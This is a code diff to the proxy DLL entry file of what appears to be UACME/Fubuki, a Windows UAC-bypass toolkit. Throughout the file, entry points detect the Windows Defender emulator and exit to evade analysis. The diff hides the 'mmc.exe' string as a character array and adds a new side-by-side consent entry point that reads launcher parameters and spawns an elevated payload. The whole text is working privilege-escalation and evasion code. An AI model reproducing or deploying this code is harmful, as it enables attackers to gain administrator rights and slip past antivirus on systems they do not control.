@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2019
+*  (C) COPYRIGHT AUTHORS, 2014 - 2020
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.19
+*  VERSION:     3.50
 *
-*  DATE:        09 Apr 2019
+*  DATE:        14 Sep 2020
 *
-*  Proxy dll entry point, Fubuki Kai Ni.
+*  Proxy dll entry point.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -20,6 +20,7 @@
 #include "fubuki.h"
 
 UACME_PARAM_BLOCK g_SharedParams;
+HANDLE g_SyncMutant = NULL;
 
 /*
 * DummyFunc
@@ -81,7 +82,7 @@ VOID DefaultPayload(
     // If this is default executable, show runtime info.
     //
     if ((lpParameter == NULL) || (cbParameter == 0)) {
-        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_KILO)
+        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
             ucmQueryRuntimeInfo(FALSE);
     }
 
@@ -93,7 +94,7 @@ VOID DefaultPayload(
         ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
-    ExitProcess(ExitCode);
+    RtlExitUserProcess(ExitCode);
 }
 
 /*
@@ -161,7 +162,7 @@ VOID UiAccessMethodPayload(
                     UnhookWindowsHookEx(hHook);
                 }
             }
-            ExitProcess(0);
+            RtlExitUserProcess(0);
         }
     }
 
@@ -200,14 +201,15 @@ BOOL WINAPI UiAccessMethodDllMain(
     _In_ LPVOID lpvReserved
 )
 {
+    WCHAR szMMC[] = { L'm', L'm', L'c', L'.', L'e', L'x', L'e', 0 };
     UNREFERENCED_PARAMETER(lpvReserved);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        ExitProcess('foff');
+        RtlExitUserProcess('foff');
     }
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        UiAccessMethodPayload(hinstDLL, TRUE, MMC_EXE);
+        UiAccessMethodPayload(hinstDLL, TRUE, szMMC);
     }
 
     return TRUE;
@@ -231,7 +233,7 @@ BOOL WINAPI DllMain(
     UNREFERENCED_PARAMETER(lpvReserved);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        ExitProcess('foff');
+        RtlExitUserProcess('foff');
     }
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
@@ -242,22 +244,21 @@ BOOL WINAPI DllMain(
 }
 
 /*
-* EntryPoint
+* EntryPointExeMode
 *
 * Purpose:
 *
 * Entry point to be used in exe mode.
 *
 */
-VOID WINAPI EntryPoint(
+VOID WINAPI EntryPointExeMode(
     VOID)
 {
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        ExitProcess('foff');
+        RtlExitUserProcess('foff');
     }
     DefaultPayload();
 }
-
 
 /*
 * EntryPointUIAccessLoader
@@ -274,7 +275,7 @@ VOID WINAPI EntryPointUIAccessLoader(
     WCHAR szParam[MAX_PATH * 2];
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        ExitProcess('foff');
+        RtlExitUserProcess('foff');
     }
 
     if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
@@ -282,5 +283,65 @@ VOID WINAPI EntryPointUIAccessLoader(
             ucmUIHackExecute(szParam);
         }
     }
-    ExitProcess(0);
+    RtlExitUserProcess(0);
+}
+
+/*
+* EntryPointSxsConsent
+*
+* Purpose:
+*
+* Entry point to be used consent sxs method.
+*
+*/
+BOOL WINAPI EntryPointSxsConsent(
+    _In_ HINSTANCE hinstDLL,
+    _In_ DWORD fdwReason,
+    _In_ LPVOID lpvReserved
+)
+{
+    BOOL bSharedParamsReadOk;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+
+    UNREFERENCED_PARAMETER(lpvReserved);
+
+    ucmDbgMsg(LoadedMsg);
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
+        RtlExitUserProcess('foff');
+
+
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+
+        LdrDisableThreadCalloutsForDll(hinstDLL);
+
+        //
+        // Read shared params block.
+        //
+        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+        if (bSharedParamsReadOk) {
+            lpParameter = g_SharedParams.szParameter;
+            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        }
+        else {
+            lpParameter = NULL;
+            cbParameter = 0UL;
+        }
+
+        ucmLaunchPayloadEx(
+            CreateProcessW,
+            lpParameter,
+            cbParameter);
+
+        //
+        // Notify Akagi.
+        //
+        if (bSharedParamsReadOk) {
+            ucmSetCompletion(g_SharedParams.szSignalObject);
+        }
+
+    }
+    return TRUE;
 }
